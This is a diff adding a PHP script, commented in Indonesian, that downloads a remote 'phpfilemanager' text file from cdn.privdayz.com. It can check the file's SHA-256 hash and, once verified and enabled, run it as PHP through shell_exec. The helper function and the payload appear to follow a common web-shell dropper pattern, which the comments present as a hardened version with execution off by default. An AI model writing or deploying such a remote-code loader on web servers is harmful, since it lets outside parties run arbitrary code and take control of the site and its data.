@@ -1,0 +1,116 @@
+<?php
+// Enable error reporting for debugging purposes (matikan di production)
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Function to get URL content (reuse method yang kamu pakai)
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 1); // aktifkan verifikasi SSL
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 2);
+        curl_setopt($conn, CURLOPT_TIMEOUT, 15);
+        $data = curl_exec($conn);
+        if (curl_errno($conn)) {
+            throw new Exception('Curl error: ' . curl_error($conn));
+        }
+        $http_code = curl_getinfo($conn, CURLINFO_HTTP_CODE);
+        curl_close($conn);
+        if ($http_code < 200 || $http_code >= 300) {
+            throw new Exception("HTTP error code: $http_code");
+        }
+    } elseif (function_exists('file_get_contents')) {
+        $context = stream_context_create([
+            'http' => ['timeout' => 15, 'user_agent' => 'PHP'],
+            "ssl" => ["verify_peer"=>true, "verify_peer_name"=>true]
+        ]);
+        $data = @file_get_contents($url, false, $context);
+        if ($data === false) {
+            throw new Exception('file_get_contents error');
+        }
+    } else {
+        throw new Exception('No supported HTTP method available (curl/file_get_contents).');
+    }
+    return $data;
+}
+
+// ---- Konfigurasi ----
+$remote_url = 'https://cdn.privdayz.com/txt/phpfilemanager.txt';
+// Jika kamu punya SHA-256 yang "benar" untuk file remote, masukkan di sini.
+// Jika null, skrip hanya akan mendownload dan menyimpan, TIDAK akan include.
+$expected_hash = null; // contoh: '3a9f...ef12' (64 hex chars)
+
+// Jika true, dan $expected_hash cocok, skrip akan melakukan include.
+// Default false: lebih aman; hanya menyimpan atau menampilkan.
+$allow_include_if_verified = false;
+
+// Folder penyimpanan sementara (pastikan ini bukan webroot)
+$tmp_dir = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'remote_php_safe';
+if (!is_dir($tmp_dir)) {
+    mkdir($tmp_dir, 0700, true);
+}
+
+// ---- Main ----
+try {
+    echo "Mengambil: $remote_url\n";
+    $content = geturlsinfo($remote_url);
+
+    // Hitung SHA-256
+    $sha256 = hash('sha256', $content);
+    echo "SHA-256: $sha256\n";
+
+    if ($expected_hash !== null) {
+        if (!preg_match('/^[0-9a-f]{64}$/i', $expected_hash)) {
+            throw new Exception("Format expected_hash tidak valid. Harus SHA-256 hex 64 karakter.");
+        }
+        if (hash_equals(strtolower($expected_hash), strtolower($sha256))) {
+            echo "Hash cocok dengan expected_hash. Berkas terverifikasi.\n";
+            $verified = true;
+        } else {
+            throw new Exception("Hash TIDAK cocok dengan expected_hash. Proses dibatalkan.");
+        }
+    } else {
+        echo "Tidak ada expected_hash diberikan — file diunduh tapi TIDAK akan dieksekusi.\n";
+        $verified = false;
+    }
+
+    // Simpan file sementara (bukan di webroot)
+    $tmp_file = $tmp_dir . DIRECTORY_SEPARATOR . 'remote_' . uniqid() . '.txt';
+    $bytes = file_put_contents($tmp_file, $content, LOCK_EX);
+    if ($bytes === false) {
+        throw new Exception("Gagal menulis file sementara.");
+    }
+    // batasi permission
+    @chmod($tmp_file, 0600);
+    echo "File disimpan di: $tmp_file (" . $bytes . " bytes)\n";
+
+    // Jika terverifikasi dan diizinkan, lakukan include (SANGAT BERBAHAYA)
+    if ($verified && $allow_include_if_verified === true) {
+        // PERINGATAN: Ini akan mengeksekusi code PHP yang berasal dari remote.
+        // Pastikan kamu hanya mengeksekusi ini kalau 100% mempercayai sumber dan hash.
+        echo "Menjalankan include() pada berkas yang terverifikasi...\n";
+        // include_once($tmp_file); // uncomment jika kamu paham risikonya
+        // Sebagai alternatif yang sedikit lebih aman: jalankan di proses terpisah (child process)
+        // dengan fungsi-fungsi berbahaya dinonaktifkan melalui CLI flags:
+        $php_cli = PHP_BINARY; // path ke binary php
+        $disabled = 'exec,shell_exec,system,passthru,proc_open,popen'; // contoh
+        $cmd = escapeshellcmd($php_cli) . ' -d disable_functions=' . escapeshellarg($disabled)
+               . ' ' . escapeshellarg($tmp_file) . ' 2>&1';
+        echo "Menjalankan di proses terpisah (dengan beberapa fungsi dinonaktifkan):\n$cmd\n";
+        // Eksekusi proses terpisah hanya jika fungsi shell_exec tersedia
+        if (function_exists('shell_exec')) {
+            $output = shell_exec($cmd);
+            echo "Output proses:\n" . $output . "\n";
+        } else {
+            echo "shell_exec tidak tersedia - tidak dapat menjalankan proses terpisah.\n";
+        }
+    } else {
+        echo "Tidak menjalankan include. Jika ingin menjalankan include otomatis, atur \$allow_include_if_verified = true dan sediakan \$expected_hash yang benar.\n";
+    }
+
+} catch (Exception $e) {
+    echo "ERROR: " . $e->getMessage() . "\n";
+}
